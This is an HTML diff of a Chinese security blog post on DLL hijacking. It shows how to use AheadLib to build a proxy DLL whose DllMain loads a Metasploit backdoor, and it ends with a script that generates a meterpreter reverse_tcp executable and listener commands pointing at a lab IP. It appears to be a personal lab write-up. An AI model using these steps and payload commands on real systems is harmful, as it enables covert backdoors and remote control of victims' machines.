@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"silver-glacier.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="dll劫持与AheadLib最近在看msf配置信息的时候，看到生成dll文件，突然就想到了dll劫持，于是准备来折腾一下 dll劫持dll文件是计算机上的一类文件，提供给使用者一些开箱即用的变量、函数或类。库文件分为静态库和动态库，静态库和动态库的区别体现在程序的链接阶段：静态库在程序的链接阶段被复制到了程序中；动态库在链接阶段没有被复制到程序中，而是程序在运行时由系统动态加载到内存中供程序调用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dll劫持与AheadLib">
+<meta property="og:url" content="https://silver-glacier.github.io/2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="dll劫持与AheadLib最近在看msf配置信息的时候，看到生成dll文件，突然就想到了dll劫持，于是准备来折腾一下 dll劫持dll文件是计算机上的一类文件，提供给使用者一些开箱即用的变量、函数或类。库文件分为静态库和动态库，静态库和动态库的区别体现在程序的链接阶段：静态库在程序的链接阶段被复制到了程序中；动态库在链接阶段没有被复制到程序中，而是程序在运行时由系统动态加载到内存中供程序调用。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/08/18/kgBDKU17lNzXWQa.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/18/wp5fkSX9FNlmr2L.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/18/BAQiGUXbHg3z8wC.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/18/1JIjvcpbeUgOWFq.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/18/zank6NWHustC2cR.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/18/1ka4ZxJv6BO32WD.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/18/Qrme8qxodRO3NGs.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/18/ylZoMNxTp2Pfire.png">
+<meta property="article:published_time" content="2022-08-18T09:49:24.000Z">
+<meta property="article:modified_time" content="2022-08-18T09:54:58.026Z">
+<meta property="article:author" content="Glacier">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/08/18/kgBDKU17lNzXWQa.png">
+
+<link rel="canonical" href="https://silver-glacier.github.io/2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>dll劫持与AheadLib | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glacier">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          dll劫持与AheadLib
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-08-18 17:49:24 / Modified: 17:54:58" itemprop="dateCreated datePublished" datetime="2022-08-18T17:49:24+08:00">2022-08-18</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="dll劫持与AheadLib"><a href="#dll劫持与AheadLib" class="headerlink" title="dll劫持与AheadLib"></a>dll劫持与AheadLib</h1><p>最近在看msf配置信息的时候，看到生成dll文件，突然就想到了dll劫持，于是准备来折腾一下</p>
+<h3 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h3><p>dll文件是计算机上的一类文件，提供给使用者一些开箱即用的变量、函数或类。库文件分为静态库和动态库，静态库和动态库的区别体现在程序的链接阶段：静态库在程序的链接阶段被复制到了程序中；动态库在链接阶段没有被复制到程序中，而是程序在运行时由系统动态加载到内存中供程序调用。使用动态库系统只需载入一次，不同的程序可以得到内存中相同的动态库的副本，因此节省了很多内存，而且使用动态库也便于模块化更新程序</p>
+<p>dll劫持是当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间</p>
+<blockquote>
+<p>简单来说，dll的存在就是方便程序来直接调用，避免将相同的内容重复多遍，以此来节省内存<br>而dll劫持，由下面一个例子说明</p>
+</blockquote>
+<p>一个可执行文件运行时，需要调用<code>test.dll</code>文件，但此时我们可以生成一个恶意的<code>test.dll</code>文件，并让他调用我们由msf生成的<code>shell.dll</code>或者其他后门，再调用原来的<code>test.dll</code>文件</p>
+<p><img src="https://s2.loli.net/2022/08/18/kgBDKU17lNzXWQa.png" alt="图解dll劫持"></p>
+<p>如果dll劫持成功了，那原本的可执行文件仍将正常使用，但我们的后门也将成功执行，即msf上线</p>
+<h3 id="AheadLib"><a href="#AheadLib" class="headerlink" title="AheadLib"></a>AheadLib</h3><p>这里推荐一个用来生成dll转发的工具<a target="_blank" rel="noopener" href="https://github.com/Yonsm/AheadLib">AheadLib</a></p>
+<p>我们随便找一个dll文件来测试一下</p>
+<p><img src="https://s2.loli.net/2022/08/18/wp5fkSX9FNlmr2L.png"></p>
+<p>我们把它生成的代码复制下来，用VisualStudio创建一个dll动态链接项目，但在这里，可能会出现比较多的问题<br>我这里使用的是ViusalStudio 2019 不同的版本可能会出现的问题不同</p>
+<p>首先项目提示我没有引入头文件，于是我加上了<code>#include &quot;pch.h&quot;</code><br>紧接着出现了如下的报错</p>
+<p><img src="https://s2.loli.net/2022/08/18/BAQiGUXbHg3z8wC.png"></p>
+<p>解决方法是，在<code>项目-&gt;属性-&gt;高级-&gt;字符集</code> 改为使用多字节字符集</p>
+<p><img src="https://s2.loli.net/2022/08/18/1JIjvcpbeUgOWFq.png"></p>
+<p>其他版本的可能存在不同的报错，可以尝试如下方法</p>
+<ol>
+<li>将运行库改为多线程(/MT)<br><img src="https://s2.loli.net/2022/08/18/zank6NWHustC2cR.png"></li>
+<li>将预编译头改为不使用<br><img src="https://s2.loli.net/2022/08/18/1ka4ZxJv6BO32WD.png"></li>
+</ol>
+<p>确认应用之后就只会有一个报错，我们不用管它，在Release x86的模式下，成功生成dll文件<br>成功处理好报错信息后，我们实现了由<code>test(evil).dll -&gt; test(org).dll</code><br>接下来实现<code>test(evil).dll-&gt;shell.dll</code><br>我们在AheadLib工具生成的cpp文件中，找到<code>DLLMain</code>函数，并加上我们需要调用的后门<code>shell.dll</code></p>
+<p><img src="https://s2.loli.net/2022/08/18/Qrme8qxodRO3NGs.png"></p>
+<p>成功编译后，将生成的dll文件改为与原dll相同的名字，即<code>test.dll</code>，将原本的test.dll改为<code>testorg.dll</code><br>这样我们就完成了dll劫持，当运行可执行文件时，将会先调用我们改写的<code>test.dll</code></p>
+<p>最后，msf成功上线</p>
+<p><img src="https://s2.loli.net/2022/08/18/ylZoMNxTp2Pfire.png"></p>
+<hr>
+<h3 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h3><p>最近浅浅的看了下sh文件的写法，于是就想到了写一些msf的sh文件，避免了每次使用msfconsole的复杂配置与msfvenum生成的复杂参数</p>
+<blockquote>
+<p>msfvenum的生成</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ip=192.168.31.208</span><br><span class="line">port=4444</span><br><span class="line">arch=x86</span><br><span class="line">platform=windows</span><br><span class="line">format=exe</span><br><span class="line">payload=windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="comment">#use exploit/muilt/handler</span></span><br><span class="line">out=../meter_re_tcp_x86.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p <span class="variable">$payload</span> LHOST=<span class="variable">$ip</span> LPORT=<span class="variable">$port</span> -f <span class="variable">$format</span> -a <span class="variable">$arch</span> --platform <span class="variable">$platform</span> -o <span class="variable">$out</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>msfconsole的监听</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.31.208</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/08/16/CS%E7%94%9F%E6%88%90hta%E5%88%86%E6%9E%90%E4%B8%8Epowershell%E5%85%8D%E6%9D%80/" rel="prev" title="CS生成hta分析与powershell免杀">
+      <i class="fa fa-chevron-left"></i> CS生成hta分析与powershell免杀
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib"><span class="nav-number">1.</span> <span class="nav-text">dll劫持与AheadLib</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dll%E5%8A%AB%E6%8C%81"><span class="nav-number">1.0.1.</span> <span class="nav-text">dll劫持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AheadLib"><span class="nav-number">1.0.2.</span> <span class="nav-text">AheadLib</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%90%8E%E9%9D%A2"><span class="nav-number">1.0.3.</span> <span class="nav-text">写在后面</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Glacier</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Glacier</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
